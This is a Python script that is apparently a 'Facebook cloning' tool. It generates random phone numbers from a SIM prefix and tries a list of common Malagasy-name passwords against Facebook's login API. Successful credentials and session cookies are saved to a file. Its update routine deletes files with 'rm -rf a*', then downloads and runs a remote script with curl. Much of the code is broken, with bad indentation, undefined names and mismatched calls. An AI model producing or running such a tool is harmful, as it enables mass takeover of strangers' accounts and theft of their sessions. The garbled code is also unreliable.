import os
import random
import string 
import uuid
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import sys
import secrets
import getpass

# Mot de passe pour déverrouiller le script
mot_de_passe = "ITACHI2024"

# Demander à l'utilisateur de saisir le mot de passe
saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")

# Vérifier si le mot de passe saisi est correct
if saisie_mot_de_passe == mot_de_passe:
    print("Mot de passe correct. Exécution de git pull...")
    # Exécuter la commande git pull
    try:
        subprocess.run(["git", "pull"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution de git pull : {e}")
        exit(1)
    print("Git pull terminé avec succès !")

#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
# Liste des couleurs pour le logo, les lignes et chaque mot
logo_colors = [B, C, P, H]
line_colors = [bblack, M, H, byellow, bblue, P, C, B]
word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
#-------------logo-----------------#
logo = """
         \033[1;37m ##     ##     ######      ######   
         \033[1;37m ###   ###    ##    ##    ##    ##  
         \033[1;37m #### ####    ##          ## 
         \033[1;37m ## ### ##     ######      ######
         \033[1;37m ##     ##          ##          ##
         \033[1;37m ##     ##    ##    ##    ##    ##
         \033[1;37m ##     ##     ######      ###### \033[1;32m LI0N\033[1;37m 
--------------------------------------------------
[•]CREATED BY     : \033[1;32mAB KHANX\033[1;37m
[•]FACEBOOK       : \033[1;32mAB KHANX\033[1;37m
[•]YOUTUBE        : \033[1;32mMSS TRICKS\033[1;37m
[•]STATUS         : \033[1;32mFREE\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 1.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
--------------------------------------------------"""

def lines():
	print('\33[1;37m--------------------------------------------------')
loop = 0
oks = []
cps = []
try:
    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def rehan():
	os.system('clear')
	print(logo)
	print('[1] RANDOM PAK CLONING')
	print('[2] RANDOM BD CLONING')
	print('[3] RANDOM CHOICE PASS CLONING')
	print('[4] CONTACT WITH OWNER')
	print('[0] EXIT')
	lines()
	gh = input('[•] CHOOSE : ')
	if gh =='1':
		menu()
	
	elif gh =='0':
		print('[•] THANKS FOR USE ')
		time.sleep(3)
		exit()
	else:
		print('[•] CHOOSE CORRECT OPTION')
		time.sleep(2)
		rehan()

def menu():
		os.system('clear')
	print(logo)
	print('[1] LAST 7 DIGIT')

	print('[0] EXIT TO MAIN MENU')
	lines()
	opt = input('[•] CHOOSE: ')
	if opt =='1':
		svn_digit()
	
	elif opt =='0':
		rehan()
	else:
		print('\n\033[1;37m[•] Choose valid option\033[0;97m')
		time.sleep(2)
		menu()
		
def svn_digit():
	user=[]
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :034,038,033,032')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
	limit = int(input('[•] ENTER LIMIT :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=70) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
			yaari.submit(method_crack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
	rehan()
	def method_crack(uid,pwx):
    global oks
    global cps
    global loop
    try:
        for ps in pwx:
		
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
                        os.makedirs("/sdcard/SAFIDY-IDS")
                    # Enregistrer dans le fichier SAFIDY-OK.txt
                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
                # Enregistrer dans le fichier SAFIDY-CP.txt
                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
